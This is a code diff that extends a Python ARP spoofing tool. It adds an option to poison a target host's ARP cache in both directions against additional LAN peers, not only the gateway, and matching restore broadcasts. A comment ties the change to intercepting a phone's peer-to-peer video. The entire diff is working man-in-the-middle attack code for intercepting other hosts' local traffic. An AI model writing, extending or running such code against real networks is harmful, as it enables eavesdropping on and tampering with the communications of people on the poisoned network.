@@ -150,7 +150,9 @@ class ArpSpoofer:
 
     def __init__(self, target_ip: str, gateway_ip: str, iface: str,
                  target_mac: str | None = None, gateway_mac: str | None = None,
-                 our_mac_addr: str | None = None, interval: float = 2.0):
+                 our_mac_addr: str | None = None, interval: float = 2.0,
+                 extra_peers: list[tuple[str, str]] | None = None):
+        """extra_peers: [(ip, mac), ...] other LAN hosts to poison both ways with target."""
         _require_private(target_ip, gateway_ip)
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
@@ -159,6 +161,7 @@ class ArpSpoofer:
         self._known_target_mac = target_mac
         self._known_gateway_mac = gateway_mac
         self.our_mac = our_mac_addr
+        self.extra_peers = list(extra_peers or [])
         self._stop = threading.Event()
         self._thread: threading.Thread | None = None
         self.target_mac: str | None = None
@@ -179,6 +182,10 @@ class ArpSpoofer:
             self._sendp(self.target_mac, self.target_ip, self.target_mac, self.gateway_ip)
             # Tell gateway: "I (our MAC) am the target"
             self._sendp(self.gateway_mac, self.gateway_ip, self.gateway_mac, self.target_ip)
+            # Optional: poison target <-> each LAN peer (see phone P2P video)
+            for peer_ip, peer_mac in self.extra_peers:
+                self._sendp(self.target_mac, self.target_ip, self.target_mac, peer_ip)
+                self._sendp(peer_mac, peer_ip, peer_mac, self.target_ip)
             self._stop.wait(self.interval)
 
     def start(self):
@@ -196,12 +203,15 @@ class ArpSpoofer:
             return
         _quiet_scapy()
         for _ in range(5):
-            # Correct: gateway owns gateway_ip
             self._sendp("ff:ff:ff:ff:ff:ff", self.target_ip, "ff:ff:ff:ff:ff:ff",
                         self.gateway_ip, hwsrc=self.gateway_mac)
-            # Correct: target owns target_ip
             self._sendp("ff:ff:ff:ff:ff:ff", self.gateway_ip, "ff:ff:ff:ff:ff:ff",
                         self.target_ip, hwsrc=self.target_mac)
+            for peer_ip, peer_mac in self.extra_peers:
+                self._sendp("ff:ff:ff:ff:ff:ff", self.target_ip, "ff:ff:ff:ff:ff:ff",
+                            peer_ip, hwsrc=peer_mac)
+                self._sendp("ff:ff:ff:ff:ff:ff", peer_ip, "ff:ff:ff:ff:ff:ff",
+                            self.target_ip, hwsrc=self.target_mac)
 
     def stop(self):
         self._stop.set()
@@ -211,7 +221,8 @@ class ArpSpoofer:
 
 
 def start(target_ip: str, gateway_ip: str | None = None, iface: str | None = None,
-          target_mac: str | None = None, gateway_mac: str | None = None):
+          target_mac: str | None = None, gateway_mac: str | None = None,
+          extra_peers: list[tuple[str, str]] | None = None):
     """Start spoofing. Returns ArpSpoofer (caller must stop()). Needs root."""
     if hasattr(os, "geteuid") and os.geteuid() != 0:
         raise PermissionError("ARP mode needs root. Re-run with sudo.")
@@ -220,12 +231,16 @@ def start(target_ip: str, gateway_ip: str | None = None, iface: str | None = Non
         raise RuntimeError("Could not determine the default gateway; pass --gateway.")
     real_iface = resolve_iface(iface)
     us = our_mac(real_iface)
+    peers = list(extra_peers or [])
     print(
         f"ARP mode: spoofing {target_ip} ({target_mac or '?'}) <-> "
-        f"gateway {gw} ({gateway_mac or '?'}) on {real_iface} (us {us}).",
+        f"gateway {gw} ({gateway_mac or '?'})"
+        + (f" + {len(peers)} LAN peer(s)" if peers else "")
+        + f" on {real_iface} (us {us}).",
         file=sys.stderr,
     )
     return ArpSpoofer(
         target_ip, gw, real_iface,
         target_mac=target_mac, gateway_mac=gateway_mac, our_mac_addr=us,
+        extra_peers=peers,
     ).start()
